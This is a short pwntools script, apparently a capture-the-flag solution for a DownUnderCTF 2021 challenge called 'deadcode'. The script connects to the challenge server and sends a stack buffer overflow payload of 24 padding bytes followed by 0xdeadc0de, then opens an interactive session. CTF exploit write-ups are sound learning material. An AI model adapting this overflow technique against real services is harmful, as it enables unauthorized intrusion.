from pwn import *

elf = ELF('deadcode')

host = 'pwn-2021.duc.tf'
port = 31916

p = remote(host, port)
# p = elf.process()

offset = 24
payload = b'A' * offset
payload += p64(0xdeadc0de)

p.sendline(payload)

p.interactive()